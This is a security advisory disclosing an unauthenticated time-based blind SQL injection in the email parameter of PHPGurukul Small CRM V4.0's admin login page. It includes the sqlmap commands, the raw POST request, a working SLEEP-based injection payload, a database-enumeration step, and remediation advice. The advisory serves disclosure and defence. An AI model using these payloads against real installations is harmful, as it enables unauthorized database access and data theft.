# PHPGurukul Small CRM in PHP V4.0 /crm/admin/index.php SQL Injection

## NAME OF AFFECTED PRODUCT(S)

- Small CRM in PHP

## Vendor Homepage

- [Small CRM in PHP](https://phpgurukul.com/small-crm-php/)

## AFFECTED AND/OR FIXED VERSION(S)

### submitter

- YoSheep

### VERSION(S)

- V4.0

### Software Link

- https://phpgurukul.com/?sdm_process_download=1&download_id=10412

## PROBLEM TYPE

### Vulnerability Type

- SQL injection

### Root Cause

- The /crm/admin/index.php component email parameter is directly inserted into SQL statement without proper sanitization or use of prepared statement. Thus, the unsafe practice allows attackers to inject crafted SQL payloads, alerting the intended query logic and executing arbitrary SQL commands in the server.

### Impact

Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

## DESCRIPTION

- During a security assessment of the *Small CRM in PHP*, a critical SQL injection vulnerability was identified in the /crm/admin/index.php file. The flaw arises from insufficient validation of the email parameter, which is directly inserted into SQL statement. Exploitation of this flaw allows unauthenticated attackers to inject arbitrary SQL statements, gain access to sensitive data, escalate privileges, and potentially gain control of the application environment. Immediate remediation is strongly advised to mitigate the risk of exploitation.

## Vulnerability Details and Proof of Concept (PoC)

### Vulnerability type:

* Time-based blind SQL injection

### Vulnerability location:

* Parameter: email (POST)

### Proof of Concept Payloads

Using sqlmap, the injection can be demonstrated as follows:

```
python3 sqlmap.py -r sql_data.txt --batch -v 3
// sql_data.txt
POST /crm/admin/index.php HTTP/1.1
Host: xxx.xxx.xxx.xxx
Content-Length: 75
Cache-Control: max-age=0
Origin: http://xxx.xxx.xxx.xxx
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://xxx.xxx.xxx.xxx/crm/admin/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: 459c73fc68b74c48fed06cd2049f9e72_ssl=664f4eeb-5d8e-4bb4-aa3e-ba03dd842b3a.acZ3bo2InCUweNQ83hgDkh4-uTI; PHPSESSID=bi4ddv20nbpset9r4ce8e39882
Connection: keep-alive

email=1&password=1&login=
```

Example Findings:

```
---
Parameter: email (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: email=admin' AND (SELECT 6424 FROM (SELECT(SLEEP(5)))LFXp) AND 'yVpu'='yVpu&password=123&login=
    Vector: AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])
---
```

![image-20250826230829181](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250826230829181.png)

### Attack Demonstration

An attacker can enumerate databases with the following command:

```
python3 sqlmap.py -r sql_data.txt --batch -v 3 --dbs
```

Example Result:

Extracted list of databases from the backend MySQL server.

![image-20250826231008140](https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250826231008140.png)

## Suggested Remediation

1. **Use Prepared Statements and Parameterized Queries**

   Implement parameterized queries (mysqli or PDO) to ensure user inputs are treated strictly as data, preventing SQL injection.

2. **Implement Input Validation and Sanitization**

   Validate incoming parameters against expected formats (e.g., numeric IDs). Reject or sanitize unexpected input before processing.

3. **Apply the Principle of Least Privilege**

   Restrict the privileges of the database account used by the application. Avoid using high-privilege accounts (e.g., root).

4. **Conduct Regular Security Audits**

   Periodically review source code and perform penetration testing to identify and remediate potential vulnerabilities.

5. **Upgrade Deprecated Libraries**

   Replace legacy mysql_* functions with mysqli or PDO, which provide better security support and long-term maintainability.